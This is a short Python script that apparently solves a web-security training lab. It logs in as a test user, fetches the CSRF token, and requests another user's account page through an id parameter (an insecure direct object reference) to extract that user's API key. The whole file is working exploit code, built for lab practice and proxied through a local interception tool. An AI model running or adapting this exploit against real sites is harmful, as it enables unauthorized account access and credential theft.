import urllib3
import requests as rs
import sys
import re
from bs4 import BeautifulSoup as bs

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http' : 'http://127.0.0.1:8080',
    'https' : 'http://127.0.0.1:8080'
}


def get_csrf_token(s,url):
    r = s.get(url,verify=False, proxies=proxies)
    soup = bs(r.text,'html.parser')
    csrf = soup.find('input',{'name':'csrf'})['value']
    csrf_tokens = {'csrf':csrf}
    sys.stdout.write("[+] CSRF Token : %s\n" % csrf)
    return csrf_tokens


def carlos_api_key(s,url):
    
    login_url = url + '/login'
    csrf_token = get_csrf_token(s,login_url)
    
    # login as wiener user
    sys.stdout.write("[+] Login as wiener user\n")
    data_login = {
        'csrf' : csrf_token['csrf'],
        'username' : 'wiener',
        'password' : 'peter'
    }

    r = s.post(login_url,data=data_login,verify=False,proxies=proxies)
    res = r.text
    if 'Log out' in res:
        sys.stdout.write("[+] Login successful\n")


        # access carlos 

        carlos_url = url + "/my-account?id=carlos"
        r = s.get(carlos_url,verify=False,proxies=proxies)
        res = r.text
        if 'carlos' in res:
            sys.stdout.write("[+] Carlos account accessed\n")
            sys.stdout.write("[+] Retrieving api key for carlos\n")

            api_key = re.search('API Key is: (.*)',res).group(1)
            print("API key is:" + api_key.split('</div>')[0])
            
        else:
            sys.stdout.write("[-] Carlos account not accessed\n")
            sys.exit(1)
    else:
        sys.stdout.write("[-] Login failed\n")
        sys.exit(1)


def main():
    if len(sys.argv) != 2:
        sys.stdout.write("Usage : python3 %s <URL>\n" % sys.argv[0])
        sys.exit(1)

    s = rs.Session()
    url = sys.argv[1]
    carlos_api_key(s,url) 


if __name__ == '__main__':
    main()


# case sensitive 